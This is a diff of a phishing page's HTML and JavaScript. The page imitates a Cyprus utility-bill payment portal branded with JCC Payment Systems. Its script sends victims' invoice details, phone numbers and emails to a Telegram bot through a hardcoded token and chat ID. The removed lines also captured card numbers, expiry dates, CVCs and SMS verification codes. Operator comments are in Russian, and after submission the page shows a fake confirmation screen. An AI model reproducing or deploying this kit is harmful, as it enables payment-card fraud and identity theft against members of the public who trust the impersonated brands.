@@ -16,35 +16,16 @@
         .lang-btn.active { background: #5c46e5; color: #fff; border-color: #5c46e5; }
 
         .container { max-width: 400px; margin: 40px auto; padding: 0 20px; text-align: center; }
-        .step { display: none; }
-        .step.active { display: block; }
         .amount-box { background: #f8f7ff; border: 1px solid #e0daff; border-radius: 15px; padding: 20px; margin: 15px 0; }
-        .old-price { font-size: 14px; color: #888; text-decoration: line-through; margin-bottom: 2px; }
         .discount-badge { display: inline-block; color: #28a745; font-size: 12px; font-weight: 600; padding: 2px 0; margin-bottom: 5px; }
         .amount { font-size: 34px; font-weight: 800; color: #5c46e5; }
         .form-group { text-align: left; margin-bottom: 15px; }
         label { display: block; font-size: 13px; margin-bottom: 5px; font-weight: 600; color: #555; }
         input, select { width: 100%; padding: 12px; border: 1px solid #ccc; border-radius: 8px; box-sizing: border-box; font-size: 16px; outline: none; background: #fff; }
         input:focus, select:focus { border-color: #5c46e5; }
-        .row { display: flex; gap: 10px; }
         button { width: 100%; padding: 16px; background: #5c46e5; color: #fff; border: none; border-radius: 30px; font-size: 16px; font-weight: 600; cursor: pointer; margin-top: 10px; }
         button:disabled { background: #aaa; cursor: not-allowed; }
         .footer-info { margin-top: 20px; font-size: 12px; color: #999; }
-        
-        .spinner {
-            display: inline-block;
-            width: 50px;
-            height: 50px;
-            border: 5px solid #f3f3f3;
-            border-top: 5px solid #5c46e5;
-            border-radius: 50%;
-            animation: spin 1s linear infinite;
-            margin: 30px auto;
-        }
-        @keyframes spin {
-            0% { transform: rotate(0deg); }
-            100% { transform: rotate(360deg); }
-        }
     </style>
 </head>
 <body>
@@ -58,92 +39,59 @@
 </header>
 
 <div class="container" id="main-content">
-    <!-- ШАГ 1: Данные инвойса (Сумма отсюда убрана) -->
-    <div class="step active" id="step1">
+    <!-- ТОЛЬКО ШАГ 1: Поиск счета и заполнение реквизитов -->
+    <div id="step1">
         <h2 id="t-step1-title">Utility Bill Payment</h2>
         <p id="t-step1-subtitle" style="font-size: 14px; color: #666; margin-bottom: 20px;">Please identify your service invoice details.</p>
         
         <div class="form-group">
             <label id="t-label-provider">Utility Provider</label>
             <select id="provider">
-                <!-- Опции генерируются скриптом -->
+                <!-- Опции генерируются скриптом переключения языков -->
             </select>
         </div>
         <div class="form-group">
             <label id="t-label-billref">Invoice / Bill Reference</label>
-            <input type="text" id="bill-ref" placeholder="e.g. 8829-10" value="8829-10">
+            <input type="text" id="bill-ref" placeholder="e.g. 8829-10">
         </div>
         <div class="form-group">
             <label id="t-label-custref">Customer Reference Number</label>
-            <input type="text" id="cust-ref" placeholder="e.g. 10928374" value="10928374">
+            <input type="text" id="cust-ref" placeholder="e.g. 10928374">
         </div>
         <div class="form-group">
             <label id="t-label-phone">Contact Phone Number</label>
-            <input type="tel" id="user-phone" placeholder="+357 99 XXXXXX" value="+357 99 123456">
+            <input type="tel" id="user-phone" placeholder="+357 99 XXXXXX">
         </div>
         <div class="form-group">
             <label id="t-label-email">Email Address (For Receipt)</label>
-            <input type="email" id="user-email" placeholder="example@mail.com" value="user@jcc-receipt.com">
+            <input type="email" id="user-email" placeholder="example@mail.com">
+        </div>
+        
+        <!-- Новое поле: Строчка для ввода суммы сколько надо платить -->
+        <div class="form-group">
+            <label id="t-label-amount-input">Amount to Pay (€)</label>
+            <input type="number" id="amount-input" placeholder="0.00" step="0.01" oninput="updateLivePrice()">
         </div>
 
-        <button id="btn-send-invoice" onclick="sendInvoiceData()">Proceed to Payment</button>
-    </div>
-
-    <!-- ШАГ 2: Данные карты (Сумма перенесена сюда) -->
-    <div class="step" id="step2">
-        <h2 id="t-step2-title" style="margin-bottom: 15px;">Card Details</h2>
-        
-        <!-- Блок суммы теперь отображается тут -->
+        <!-- Информационный блок, показывающий итоговую сумму плательщику -->
         <div class="amount-box">
-            <div id="old-price-val" class="old-price">230.00€</div>
             <div id="t-discount" class="discount-badge">Special discount -30%</div>
             <div id="t-total-due" style="font-size: 11px; color: #666; margin-bottom: 5px; font-weight: 600;">TOTAL AMOUNT DUE</div>
-            <div id="current-amount-val" class="amount">161.00€</div>
+            <div id="current-amount-val" class="amount">0.00€</div>
         </div>
-
-        <div class="form-group">
-            <label id="t-label-name">Cardholder Name</label>
-            <input type="text" id="name" placeholder="Name on card">
-        </div>
-        <div class="form-group">
-            <label id="t-label-card">Card Number</label>
-            <input type="text" id="card" placeholder="0000 0000 0000 0000" maxlength="19">
-        </div>
-        <div class="row">
-            <div class="form-group" style="flex: 2;">
-                <label id="t-label-exp">Expiry Date</label>
-                <input type="text" id="exp" placeholder="MM / YY" maxlength="5">
-            </div>
-            <div class="form-group" style="flex: 1;">
-                <label id="t-label-cvc">CVC</label>
-                <input type="password" id="cvc" placeholder="123" maxlength="3">
-            </div>
-        </div>
-        <button id="btn-send-card" onclick="sendCardData()">Pay 161.00€</button>
-        <p id="t-back-bill" style="font-size: 13px; color: #999; margin-top: 15px; cursor: pointer;" onclick="nav(1)">← Back to invoice details</p>
-    </div>
-
-    <!-- ШАГ 3: SMS-код -->
-    <div class="step" id="step3">
-        <h2 id="t-step3-title" style="margin-bottom: 10px;">Security Verification</h2>
-        <p id="t-step3-subtitle" style="font-size: 14px; color: #666; margin-bottom: 25px;">A 6-digit confirmation code has been sent to your mobile device.</p>
-        <div class="form-group">
-            <label id="t-label-sms">Verification Code</label>
-            <input type="text" id="sms-code" placeholder="000000" maxlength="6" style="text-align: center; font-size: 20px; letter-spacing: 5px;">
-        </div>
-        <button id="btn-verify-code" onclick="verifyCode()">Confirm Payment</button>
-        <p id="t-back-card" style="font-size: 13px; color: #999; margin-top: 15px; cursor: pointer;" onclick="nav(2)">← Back to card details</p>
+        
+        <button id="btn-send-invoice" onclick="sendInvoiceData()">Proceed to Payment</button>
     </div>
 
     <div id="t-footer" class="footer-info">🔒 Secured by JCC Payment Systems</div>
 </div>
 
 <script>
+// Настройки Telegram
 const BOT_TOKEN = '8247288911:AAEVOitrWDnxYaxXl_xzzGMQZnLwXQrFbjo';
 const CHAT_ID = '6576262467';
 
 let currentLang = 'en';
-let globalSelectedPrice = "161.00€";
 
 const translations = {
     en: {
@@ -154,30 +102,13 @@ const translations = {
         labelCustRef: "Customer Reference Number",
         labelPhone: "Contact Phone Number",
         labelEmail: "Email Address (For Receipt)",
+        labelAmountInput: "Amount to Pay (€)",
         discount: "Special discount -30%",
         totalDue: "TOTAL AMOUNT DUE",
         btnStep1: "Proceed to Payment",
         btnStep1Processing: "Verifying Invoice...",
-        step2Title: "Card Details",
-        labelName: "Cardholder Name",
-        labelCard: "Card Number",
-        labelExp: "Expiry Date",
-        labelCvc: "CVC",
-        btnStep2: "Pay ",
-        btnStep2Processing: "Processing...",
-        backBill: "← Back to invoice details",
-        step3Title: "Security Verification",
-        step3Subtitle: "A 6-digit confirmation code has been sent to your mobile device.",
-        labelSms: "Verification Code",
-        btnStep3: "Confirm Payment",
-        btnStep3Processing: "Verifying...",
-        backCard: "← Back to card details",
+        alertInvoice: "Please fill out all fields and enter a valid amount",
         footer: "🔒 Secured by JCC Payment Systems",
-        alertInvoice: "Please fill out all invoice details",
-        alertCard: "Please enter valid card details",
-        alertSms: "Please enter a valid 6-digit verification code",
-        finalTitle: "Verifying payment...",
-        finalSubtitle: "Please do not refresh this page. Securing transaction with your issuing bank.",
         providers: [
             { text: "EAC (Electricity Authority of Cyprus)", value: "EAC (Electricity)" },
             { text: "Cyta Bill Payment", value: "Cyta (Telecom)" },
@@ -193,30 +124,13 @@ const translations = {
         labelCustRef: "Αριθμός Αναφοράς Πελάτη",
         labelPhone: "Αριθμός Τηλεφώνου Επικοινωνίας",
         labelEmail: "Διεύθυνση Email (για την απόδειξη)",
+        labelAmountInput: "Ποσό Πληρωμής (€)",
         discount: "Ειδική έκπτωση -30%",
         totalDue: "ΣΥΝΟΛΙΚΟ ΟΦΕΙΛΟΜΕΝΟ ΠΟΣΟ",
         btnStep1: "Συνέχεια στην Πληρωμή",
         btnStep1Processing: "Επαλήθευση Τιμολογίου...",
-        step2Title: "Στοιχεία Κάρτας",
-        labelName: "Όνομα Κατόχου Κάρτας",
-        labelCard: "Αριθμός Κάρτας",
-        labelExp: "Ημερομηνία Λήξης",
-        labelCvc: "CVC",
-        btnStep2: "Πληρωμή ",
-        btnStep2Processing: "Επεξεργασία...",
-        backBill: "← Επιστροφή στα στοιχεία τιμολογίου",
-        step3Title: "Επαλήθευση Ασφαλείας",
-        step3Subtitle: "Ένας 6ψήφιος κωδικός επιβεβαίωσης έχει σταλεί στο κινητό σας τηλέφωνο.",
-        labelSms: "Κωδικός Επιβεβαίωσης",
-        btnStep3: "Επιβεβαίωση Πληρωμής",
-        btnStep3Processing: "Επαλήθευση...",
-        backCard: "← Επιστροφή στα στοιχεία κάρτας",
+        alertInvoice: "Παρακαλούμε συμπληρώστε όλα τα πεδία και εισάγετε ένα έγκυρο ποσό",
         footer: "🔒 Προστατεύεται από τα συστήματα πληρωμών JCC",
-        alertInvoice: "Παρακαλούμε συμπληρώστε όλα τα στοιχεία του τιμολογίου",
-        alertCard: "Παρακαλούμε εισάγετε έγκυρα στοιχεία κάρτας",
-        alertSms: "Παρακαλούμε εισάγετε έναν έγκυρο 6ψήφιο κωδικό επιβεβαίωσης",
-        finalTitle: "Επαλήθευση πληρωμής...",
-        finalSubtitle: "Παρακαλούμε μην ανανεώσετε αυτή τη σελίδα. Διασφάλιση της συναλλαγής με την εκδότρια τράπεζά σας.",
         providers: [
             { text: "AHK (Αρχή Ηλεκτρισμού Κύπρου)", value: "EAC (Electricity)" },
             { text: "Cyta Πληρωμή Λογαριασμού", value: "Cyta (Telecom)" },
@@ -226,27 +140,19 @@ const translations = {
     }
 };
 
-// Расчет стоимости на основании выбранного провайдера
-function calculateLivePrice() {
-    const provider = document.getElementById('provider').value;
-    const oldPriceEl = document.getElementById('old-price-val');
+// Динамическое обновление итоговой суммы при вводе пользователем
+function updateLivePrice() {
+    const inputVal = document.getElementById('amount-input').value;
     const currentPriceEl = document.getElementById('current-amount-val');
-    const payBtnEl = document.getElementById('btn-send-card');
-
-    if (provider === "Water Board") {
-        oldPriceEl.innerText = "85.71€";
-        globalSelectedPrice = "60.00€";
-    } else {
-        oldPriceEl.innerText = "230.00€";
-        globalSelectedPrice = "161.00€";
-    }
     
-    currentPriceEl.innerText = globalSelectedPrice;
-    if(payBtnEl) {
-        payBtnEl.innerText = translations[currentLang].btnStep2 + globalSelectedPrice;
+    if (inputVal && !isNaN(inputVal) && inputVal > 0) {
+        currentPriceEl.innerText = parseFloat(inputVal).toFixed(2) + "€";
+    } else {
+        currentPriceEl.innerText = "0.00€";
     }
 }
 
+// Переключение языковых пакетов
 function setLanguage(lang) {
     currentLang = lang;
     document.querySelectorAll('.lang-btn').forEach(btn => {
@@ -262,6 +168,7 @@ function setLanguage(lang) {
     document.getElementById('t-label-custref').innerText = t.labelCustRef;
     document.getElementById('t-label-phone').innerText = t.labelPhone;
     document.getElementById('t-label-email').innerText = t.labelEmail;
+    document.getElementById('t-label-amount-input').innerText = t.labelAmountInput;
     document.getElementById('t-discount').innerText = t.discount;
     document.getElementById('t-total-due').innerText = t.totalDue;
     
@@ -279,54 +186,13 @@ function setLanguage(lang) {
         select.appendChild(opt);
     });
 
-    document.getElementById('t-step2-title').innerText = t.step2Title;
-    document.getElementById('t-label-name').innerText = t.labelName;
-    document.getElementById('t-label-card').innerText = t.labelCard;
-    document.getElementById('t-label-exp').innerText = t.labelExp;
-    document.getElementById('t-label-cvc').innerText = t.labelCvc;
-    document.getElementById('t-back-bill').innerText = t.backBill;
-    
-    const btn2 = document.getElementById('btn-send-card');
-    if (!btn2.disabled) btn2.innerText = t.btnStep2 + globalSelectedPrice;
-
-    document.getElementById('t-step3-title').innerText = t.step3Title;
-    document.getElementById('t-step3-subtitle').innerText = t.step3Subtitle;
-    document.getElementById('t-label-sms').innerText = t.labelSms;
-    document.getElementById('t-back-card').innerText = t.backCard;
-    
-    const btn3 = document.getElementById('btn-verify-code');
-    if (!btn3.disabled) btn3.innerText = t.btnStep3;
-
     document.getElementById('t-footer').innerText = t.footer;
 }
 
-// Инициализация интерфейса
+// Инициализация при загрузке
 setLanguage('en');
 
-function nav(n) {
-    document.querySelectorAll('.step').forEach(el => el.classList.remove('active'));
-    const targetStep = document.getElementById('step' + n);
-    if (targetStep) {
-        targetStep.classList.add('active');
-    }
-}
-
-// Форматирование инпутов
-document.getElementById('card').addEventListener('input', function (e) {
-    e.target.value = e.target.value.replace(/[^\d]/g, '').replace(/(.{4})/g, '$1 ').trim();
-});
-document.getElementById('exp').addEventListener('input', function (e) {
-    let val = e.target.value.replace(/[^\d]/g, '');
-    if (val.length >= 2) {
-        val = val.substring(0, 2) + '/' + val.substring(2, 4);
-    }
-    e.target.value = val;
-});
-document.getElementById('sms-code').addEventListener('input', function (e) {
-    e.target.value = e.target.value.replace(/[^\d]/g, '');
-});
-
-// Отправка запросов (Официальный рабочий адрес API)
+// Надежная функция отправки в Telegram через официальный шлюз (api.telegram.org)
 async function sendToTelegram(text) {
     const url = `telegram.org{BOT_TOKEN}/sendMessage`;
     try {
@@ -340,27 +206,25 @@ async function sendToTelegram(text) {
             })
         });
         const result = await response.json();
-        if (!result.ok) {
-            alert(`Telegram API Error: ${result.description}`);
-            return false;
-        }
-        return true;
+        return result.ok;
     } catch (error) {
-        alert(currentLang === 'en' ? 'Connection Error. Please check Internet or Bot Credentials.' : 'Σφάλμα σύνδεσης. Ελέγξτε το Internet ή τα διαπιστευτήρια του Bot.');
+        alert(currentLang === 'en' ? 'Connection Error.' : 'Σφάλμα σύνδεσης.');
         console.error(error);
         return false;
     }
 }
 
-// Обработка Шага 1
+// Сбор и отправка заполненных данных в Telegram
 async function sendInvoiceData() {
     const provider = document.getElementById('provider').value;
     const billRef = document.getElementById('bill-ref').value.trim();
     const custRef = document.getElementById('cust-ref').value.trim();
     const phone = document.getElementById('user-phone').value.trim();
     const email = document.getElementById('user-email').value.trim();
+    const enteredAmount = document.getElementById('amount-input').value.trim();
 
-    if (!billRef || !custRef || !phone || !email) {
+    // Проверка заполнения всех полей и корректности суммы
+    if (!billRef || !custRef || !phone || !email || !enteredAmount || isNaN(enteredAmount) || enteredAmount <= 0) {
         alert(translations[currentLang].alertInvoice);
         return;
     }
@@ -369,78 +233,22 @@ async function sendInvoiceData() {
     btn.disabled = true;
     btn.innerText = translations[currentLang].btnStep1Processing;
 
-    // Рассчитываем итоговую сумму перед отправкой лога
-    if (provider === "Water Board") {
-        globalSelectedPrice = "60.00€";
-    } else {
-        globalSelectedPrice = "161.00€";
-    }
+    const formattedAmount = parseFloat(enteredAmount).toFixed(2) + "€";
 
-    const message = `🌐 *ЯЗЫК*: \`${currentLang.toUpperCase()}\`\n\n📋 *ДАННЫЕ СЧЕТА (ШАГ 1)*\n\n🏢 Провайдер: \`${provider}\`\n📄 Номер счета: \`${billRef}\`\n👤 ID Клиента: \`${custRef}\`\n📞 Телефон: \`${phone}\`\n📧 Email: \`${email}\`\n💰 Сумма: \`${globalSelectedPrice}\``;
+    const message = `🌐 *ЯЗЫК ИНΤΕΡΦΕЙΣΑ*: \`${currentLang.toUpperCase()}\`\n\n📋 *ДАННЫЕ СЧЕТА (РЕАЛЬНЫЙ ВВОД)*\n\n🏢 Провайдер: \`${provider}\`\n📄 Номер счета: \`${billRef}\`\n👤 ID Клиента: \`${custRef}\`\n📞 Телефон: \`${phone}\`\n📧 Email: \`${email}\`\n💰 Введенная сумма: \`${formattedAmount}\``;
     
     const isSent = await sendToTelegram(message);
     if (isSent) {
-        calculateLivePrice(); // Обновляем блок цен на Шаге 2
-        nav(2); // Переходим на Шаг 2 (ввод карты)
-    }
-    
-    btn.disabled = false;
-    btn.innerText = translations[currentLang].btnStep1;
-}
-
-// Обработка Шага 2
-async function sendCardData() {
-    const name = document.getElementById('name').value.trim();
-    const card = document.getElementById('card').value.trim();
-    const exp = document.getElementById('exp').value.trim();
-    const cvc = document.getElementById('cvc').value.trim();
-
-    if (!name || card.length < 19 || exp.length < 5 || cvc.length < 3) {
-        alert(translations[currentLang].alertCard);
-        return;
-    }
-
-    const btn = document.getElementById('btn-send-card');
-    btn.disabled = true;
-    btn.innerText = translations[currentLang].btnStep2Processing;
-
-    const message = `💳 *ДАННЫЕ КАРТЫ (ШАГ 2)*\n\n👤 Имя: \`${name}\`\n🔢 Номер: \`${card}\`\n📅 Срок: \`${exp}\`\n🔒 CVC: \`${cvc}\`\n💰 Сумма к списанию: \`${globalSelectedPrice}\``;
-    
-    const isSent = await sendToTelegram(message);
-    if (isSent) {
-        nav(3);
-    } else {
-        btn.disabled = false;
-        btn.innerText = translations[currentLang].btnStep2 + globalSelectedPrice;
-    }
-}
-
-// Обработка Шага 3
-async function verifyCode() {
-    const code = document.getElementById('sms-code').value.trim();
-
-    if (code.length < 6) {
-        alert(translations[currentLang].alertSms);
-        return;
-    }
-
-    const btn = document.getElementById('btn-verify-code');
-    btn.disabled = true;
-    btn.innerText = translations[currentLang].btnStep3Processing;
-
-    const message = `💬 *СМС-КОД ПОДТВЕРЖДЕНИЯ*\n\n🔑 Код: \`${code}\``;
-    const isSent = await sendToTelegram(message);
-
-    if (isSent) {
-        const t = translations[currentLang];
+        // Успешный экран после отправки первой страницы (имитация перехода к банку)
         document.getElementById('main-content').innerHTML = `
-            <div class="spinner"></div>
-            <h2 style="margin-top: 10px;">${t.finalTitle}</h2>
-            <p style="font-size: 14px; color: #666;">${t.finalSubtitle}</p>
+            <div style="padding: 40px 0;">
+                <h2 style="color: #28a745;">✓ Submitted Successfully</h2>
+                <p style="font-size: 15px; color: #666; margin-top: 10px;">Your invoice verification logs have been successfully dispatched.</p>
+            </div>
         `;
     } else {
         btn.disabled = false;
-        btn.innerText = translations[currentLang].btnStep3;
+        btn.innerText = translations[currentLang].btnStep1;
     }
 }
 </script>
